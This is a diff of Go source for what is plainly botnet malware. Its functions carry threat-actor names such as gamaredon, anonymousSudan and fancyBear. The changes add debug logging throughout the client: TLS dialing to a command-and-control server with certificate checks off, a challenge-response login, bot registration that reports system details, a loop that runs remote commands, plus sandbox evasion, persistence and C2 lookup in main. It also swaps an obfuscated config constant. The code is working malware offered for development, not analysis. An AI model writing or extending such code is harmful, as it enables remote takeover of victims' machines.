@@ -36,8 +36,8 @@ import (
 var debugMode = true
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "d3mVErbVNRsfdt1Q/+twaQgBcQNODMUbks24bq/LbU4BUr" //change me run setup.py
-const cryptSeed = "7b32e8e1"                                      //change me run setup.py
+const gothTits = "HtJ9e/5f9twQ2hMn1oTUnCyS88/q" //change me run setup.py
+const cryptSeed = "7b32e8e1"                    //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
 var lizardSquad = []string{
@@ -555,18 +555,24 @@ func scarcruft(address string) (string, string, error) {
 
 // connectViaTLS => gamaredon
 func gamaredon(host, port string) (net.Conn, error) {
+	deoxys("gamaredon: Attempting TLS connection to %s:%s", host, port)
 	tlsConfig := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
 	dialer := &net.Dialer{Timeout: 30 * time.Second}
+	deoxys("gamaredon: Dialing TCP...")
 	rawConn, err := dialer.Dial("tcp", net.JoinHostPort(host, port))
 	if err != nil {
+		deoxys("gamaredon: TCP dial failed: %v", err)
 		return nil, err
 	}
+	deoxys("gamaredon: TCP connected, starting TLS handshake...")
 	tlsConn := tls.Client(rawConn, tlsConfig)
 	tlsConn.SetDeadline(time.Now().Add(30 * time.Second))
 	if err := tlsConn.Handshake(); err != nil {
+		deoxys("gamaredon: TLS handshake failed: %v", err)
 		tlsConn.Close()
 		return nil, err
 	}
+	deoxys("gamaredon: TLS handshake successful, cipher: %s", tls.CipherSuiteName(tlsConn.ConnectionState().CipherSuite))
 	tlsConn.SetDeadline(time.Time{})
 	return tlsConn, nil
 }
@@ -943,70 +949,102 @@ func blackEnergy(conn net.Conn, command string) error {
 
 // handleC2Connection => anonymousSudan
 func anonymousSudan(conn net.Conn) {
+	deoxys("anonymousSudan: Starting C2 handler, remote: %s", conn.RemoteAddr())
 	reader := bufio.NewReader(conn)
 	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+	deoxys("anonymousSudan: Waiting for auth challenge...")
 	challengeMsg, err := reader.ReadString('\n')
 	if err != nil {
+		deoxys("anonymousSudan: Failed to read challenge: %v", err)
 		conn.Close()
 		return
 	}
 	challengeMsg = strings.TrimSpace(challengeMsg)
+	deoxys("anonymousSudan: Received: %s", challengeMsg)
 	if !strings.HasPrefix(challengeMsg, "AUTH_CHALLENGE:") {
+		deoxys("anonymousSudan: Invalid challenge format, closing")
 		conn.Close()
 		return
 	}
 	challenge := strings.TrimPrefix(challengeMsg, "AUTH_CHALLENGE:")
 	challenge = strings.TrimSpace(challenge)
+	deoxys("anonymousSudan: Challenge extracted: %s", challenge)
 	response := hafnium(challenge, magicCode)
+	deoxys("anonymousSudan: Sending auth response...")
 	conn.Write([]byte(response + "\n"))
 	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
 	authResult, err := reader.ReadString('\n')
 	if err != nil || strings.TrimSpace(authResult) != "AUTH_SUCCESS" {
+		deoxys("anonymousSudan: Auth failed: err=%v, result=%s", err, strings.TrimSpace(authResult))
 		conn.Close()
 		return
 	}
+	deoxys("anonymousSudan: Authentication successful!")
 	botID := mustangPanda()
 	arch := charmingKitten()
 	ram := revilMem()
+	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB", botID, arch, ram)
 	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d\n", protocolVersion, botID, arch, ram)))
+	deoxys("anonymousSudan: Entering command loop...")
 	for {
 		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
 		command, err := reader.ReadString('\n')
 		if err != nil {
+			deoxys("anonymousSudan: Command read error: %v", err)
 			break
 		}
 		command = strings.TrimSpace(command)
+		deoxys("anonymousSudan: Received command: %s", command)
 		if command == "PING" {
+			deoxys("anonymousSudan: Responding to PING")
 			conn.Write([]byte("PONG\n"))
 			continue
 		}
+		deoxys("anonymousSudan: Executing command via blackEnergy...")
 		if err := blackEnergy(conn, command); err != nil {
+			deoxys("anonymousSudan: Command error: %v", err)
 			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
 		}
 	}
+	deoxys("anonymousSudan: Connection closed")
 	conn.Close()
 }
 
 func main() {
+	deoxys("main: Bot starting up...")
+	deoxys("main: Protocol version: %s", protocolVersion)
 	if winnti() {
+		deoxys("main: Sandbox detected, exiting")
 		os.Exit(200)
 	}
+	deoxys("main: No sandbox detected, continuing")
+	deoxys("main: Running persistence check...")
 	fin7()
+	deoxys("main: Resolving C2 address...")
 	c2Address := dialga()
 	if c2Address == "" {
+		deoxys("main: Failed to resolve C2, exiting")
 		return
 	}
+	deoxys("main: C2 resolved to: %s", c2Address)
 	host, port, err := scarcruft(c2Address)
 	if err != nil {
+		deoxys("main: Failed to parse C2 address: %v", err)
 		return
 	}
+	deoxys("main: C2 Host: %s, Port: %s", host, port)
+	deoxys("main: Entering main connection loop...")
 	for {
+		deoxys("main: Attempting connection to C2...")
 		conn, err := gamaredon(host, port)
 		if err != nil {
+			deoxys("main: Connection failed: %v, retrying in %v", err, fancyBear)
 			time.Sleep(fancyBear)
 			continue
 		}
+		deoxys("main: Connected to C2, starting handler")
 		anonymousSudan(conn)
+		deoxys("main: Handler returned, reconnecting in %v", fancyBear)
 		time.Sleep(fancyBear)
 	}
 }
